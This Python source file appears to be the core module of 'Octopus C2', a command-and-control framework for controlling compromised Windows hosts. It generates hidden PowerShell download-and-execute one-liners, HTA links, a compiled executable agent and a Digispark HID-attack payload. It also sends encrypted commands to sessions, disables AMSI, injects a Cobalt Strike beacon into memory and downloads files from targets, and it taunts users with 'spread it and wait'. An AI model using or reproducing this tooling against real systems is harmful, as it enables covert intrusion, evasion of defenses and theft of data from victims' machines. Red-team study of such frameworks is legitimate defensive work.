#!/usr/bin/python

from tabulate import tabulate
import threading
from flask import *
from termcolor import colored
import logging
import base64
import random
import string
from .encryption import *
from profile import *
import time
import os
import socket
from socket import SO_REUSEADDR, SOL_SOCKET


requests = []
counter = 1
listener_id = 0
connections_information = {}
listeners_information = {}
commands = {}
key = "".join([random.choice(string.ascii_uppercase) for i in range(32)])
aes_encryption_key = base64.b64encode(bytearray(key, "UTF-8")).decode()

oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell", "generate_exe","generate_hta", "generate_digispark"]

oct_commands_interact = ["load", "help", "exit", "back", "clear", "download", "load", "report", "disable_amsi", "modules", "deploy_cobalt_beacon"]

def check_url(url):
    if len(listeners_information) > 0:
        for listener in listeners_information:
            if url == listeners_information[listener][5]:
                    return False
            else:
	               return True
    else:
	    return True

def check_listener_name(listener_name):
	if len(listeners_information) > 0:
	    for listener in listeners_information:
		    if listener_name == listeners_information[listener][0]:
			    return False
		    else:
			    return True
	else:
		return True

def check_create_path(hostname):
	if len(listeners_information) > 0:
	    for listener in listeners_information:
		    if hostname == listeners_information[listener][3]:
			    return False
		    else:
			    return True
	else:
		return True

def check_listener_port(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # dont check standard timeout
    sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

    try:
        sock.bind((host, port))
        sock.close()
        return True
    except:
        return False

def list_sessions():
	    data = []
	    for key in connections_information:
               data.append(connections_information[key])
	    print(("\n\n" + tabulate(data, ["Session", "IP", "Hostname", "PID", "Username", "Domain", "Last ping", "OS"], "simple") + "\n\n"))

def get_history():
    f = open(".console_history.oct", "r")
    print((f.read()))

def list_listeners():
	    data = []
	    for key in listeners_information:
	        data.append(listeners_information[key])
            # listener_name, ip, port, host, interval, path, listener_name
	    print(("\n\n" + tabulate(data, ["Name", "IP", "Port", "Host", "Interval", "Path", "SSL"], "simple") + "\n\n"))


def completer(text, state):
    options = [i for i in oct_commands if i.startswith(text)]
    if state < len(options):
        return options[state]
    else:
        return None

def completer_interact(text, state):
    options = [i for i in oct_commands_interact if i.startswith(text)]
    if state < len(options):
        return options[state]
    else:
        return None

def send_command(session, command):
    encrypted_command = encrypt_command(aes_encryption_key, command)
    commands[session] = encrypted_command
    print("[+] Command sent , waiting for results")

def delete(hostname, sid):
    send_command(hostname, "kill $pid")
    time.sleep(5)
    commands.pop(hostname)
    connections_information.pop(sid)
    print(("[+] Session %s killed !"%hostname))

def list_modules():
	if os.path.isdir("modules"):
		modules = os.listdir("modules")
		for module in modules:
			oct_commands_interact.append(module)
			print(module)
	else:
		print((colored("[-] modules directory not Available")))

def persistence():
    # to do
    pass

def load_module(session, module_name):
	module = "modules/" + module_name
	if os.path.isfile(module):
		fi = open(module, "r")
		module_content = fi.read()
		# encrypt module before send it
		base64_command = encrypt_command(aes_encryption_key, module_content)
		commands[session] = base64_command
		print((colored("[+] Module should be loaded !", "green")))
	else:
		print((colored("[-] Module is not exist !")))

def load_beacon(session, beacon_path):
	fi = open(beacon_path, "r")
	module_content = fi.read()
	# encrypt module before send it
	base64_command = encrypt_command(aes_encryption_key, module_content)
	commands[session] = base64_command

def deploy_cobalt_beacon(session, beacon_path):
    if os.path.isfile(beacon_path):
        print(colored("[+] Deploying Cobalt Strike Beacon into Octopus agent", "green"))
        print(colored("[+] Disabling AMSI before running the Beacon", "green"))
        disable_amsi(session)
        # wait until the disable amsi loaded correctly
        # need some tests, not stable
        time.sleep(2)
        load_beacon(session, beacon_path)
        print(colored("[+]Cobalt Strike Beacon should be loaded into memory!", "green"))

    else:
        print(colored("[-] Powershell beacon file not exist!"))

def disable_amsi(session):
	amsi_module = "modules/ASBBypass.ps1"
	if os.path.isfile(amsi_module):
		fi = open(amsi_module, "r")
		module_content = fi.read()
		base64_command = encrypt_command(aes_encryption_key, module_content)
		commands[session] = base64_command
		print((colored("AMSI disable module has been loaded !", "green")))

	else:
		print((colored("[-] AMSI Module is not exist !")))

def generate(hostname, path, proto, interval):
    c = random.choice(string.ascii_lowercase)
    print((colored("#====================", "red")))
    print(("1) powershell -w hidden " + '"IEX (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"\n'.format(hostname, path, proto)))
    print(("2) powershell -w hidden " + '"Invoke-Expression (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"\n'.format(hostname, path, proto)))
    print(("3) powershell -w hidden " + '"${3} = (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');Invoke-Expression ${3};"\n'.format(hostname, path, proto, c)))
    print("Note - For Windows 7 clients you may need to prefix the payload with " + '"Add-Type -AssemblyName System.Core;"')
    print(("       e.g. powershell -w hidden " + '"Add-Type -AssemblyName System.Core;IEX (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"\n'.format(hostname, path, proto)))
    print("Hack your way in ;)")
    print((colored("#====================", "red")))

def generate_hta(host_ip, port,proto):
    print((colored("#====================", "red")))
    print(("mshta " + '{0}://{1}:{2}{3}'.format(proto,host_ip,port, mshta_url)))
    print("spread it and wait ;)")
    print((colored("#====================", "red")))

def generate_digispark(hostname, path, proto, output_path):
    url = "{2}://{0}/{1}".format(hostname, path, proto)
    # Open the ducky template
    ino_template = open("agents/agent.ino")
    template = ino_template.read()
    # Replace the URL
    code = template.replace("OCT_URL", url)
    try:
        f = open(output_path, "w")
        f.write(code)
        f.close()
        print((colored("[+] file generated successfully!", "green")))
    except:
        print("[-] error while generating the file!")


def generate_exe(hostname, path, proto, output_path):
	if os.system("which mono-csc") == 0:
		url = "{2}://{0}/{1}".format(hostname, path, proto)
		ft = open("agents/octopus.cs")
		template = ft.read()
		code = template.replace("OCT_URL", url)
		f = open("tmp.cs", "w")
		f.write(code)
		f.close()
		compile_command = "mono-csc /reference:includes/System.Management.Automation.dll tmp.cs /out:%s" % output_path
		if os.system(compile_command) == 0:
			print((colored("[+] file compiled successfully !", "green")))
			print((colored("[+] binary file saved to {0}".format(output_path), "red")))
			os.system("rm tmp.cs")
		else:
			print("[-] error while compiling !")
	else:
		print("[-] mono-csc is not installed !")


def main_help_banner():
    print("\n")
    print("Available commands to use :\n")
    print("Hint : the commands with * have arguments and you can see them by typing the command name only\n")
    print("+++++++++")
    print("help  \t\t\t\tshow this help menu")
    print("list  \t\t\t\tlist all connected agents")
    print("listeners \t\t\tlist all listeners")
    print("* generate_powershell \t\tgenerate powershell oneliner")
    print("* generate_hta \t\t\tgenerate HTA Link")
    print("* generate_exe \t\t\tgenerate executable agent")
    print("* generate_digispark \t\tgenerate digispark file (HID Attack)")
    print("* listen_http  \t\t\tto start a HTTP listener")
    print("* listen_https  \t\tto start a HTTPS listener")
    print("interact {session}  \t\tto interact with a session")
    print("delete {session}  \t\tto delete a session")
    print("exit \t\t\t\texit current session")
    print("\n")

def http_help_banner():
    print("\n##########")
    print("Options info : \n")
    print("BindIP  \t\tIP address that will be used by the listener")
    print("BindPort  \t\tport you want to listen on")
    print("Hostname \t\twill be used to request the payload from")
    print("Interval \t\thow may seconds that agent will wait before check for commands")
    print("URL  \t\t\tpage name will hold the payload")
    print("Listener_name  \t\tlistener name to use\n")

# certficate_path key_path
def https_help_banner():
    print("\n##########")
    print("Options info : \n")
    print("BindIP  \t\tIP that will be used by the listener")
    print("BindPort  \t\tport you want to listen on")
    print("Hostname \t\twill be used to request the payload from")
    print("Interval \t\thow may seconds that agent will wait before check for commands")
    print("URL  \t\t\tpage name will hold the payload")
    print("certficate_path \t the full path for the ssl certficate")
    print("key_path \t\t the full path for the ssl certficate private key\n")


    print("Listener_name  \t\tlistener name to use")
def interact_help():
	print("\n")
	print("Available commands to use :\n")
	print("Hint : if you want to execute system command just type it and wait for the results\n")
	print("+++++++++")
	print("help  \t\t\t\tshow this help menu")
	print("exit/back \t\t\texit current session and back to the main screen")
	print("clear \t\t\t\tclear the screen output")
	print("download \t\t\tdownload file from the target machine")
	print("deploy_cobalt_beacon \t\tdeploy cobalt strike powershell beacon in the current process")
	print("load \t\t\t\tload powershell module to the target machine")
	print("disable_amsi \t\t\tdisable AMSI on the target machine")
	print("report \t\t\t\tget situation report from the target")
	print("\n")


def banner():
	# \033[94m
    version = '\33[43m V1.0 Beta \033[0m'
    Yellow = '\33[33m'
    OKGREEN = '\033[92m'
    CRED = '\033[91m'
    ENDC = '\033[0m'

    banner =  r'''

{0}
  /$$$$$$              /$$
 /$$__  $$            | $$
| $$  \ $$  /$$$$$$$ /$$$$$$    /$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$$
| $$  | $$ /$$_____/|_  $$_/   /$$__  $$ /$$__  $$| $$  | $$ /$$_____/
| $$  | $$| $$        | $$    | $$  \ $$| $$  \ $$| $$  | $$|  $$$$$$
| $$  | $$| $$        | $$ /$$| $$  | $$| $$  | $$| $$  | $$ \____  $$
|  $$$$$$/|  $$$$$$$  |  $$$$/|  $$$$$$/| $$$$$$$/|  $$$$$$/ /$$$$$$$/
 \______/  \_______/   \___/   \______/ | $$____/  \______/ |_______/
                                        | $$
                                        | $$
                                        |__/

{1}

					    {3}V1.0 BETA !{1}


{2} Octopus C2 | Control your shells {1}

    '''


    print((banner.format(CRED, ENDC, OKGREEN, Yellow)))
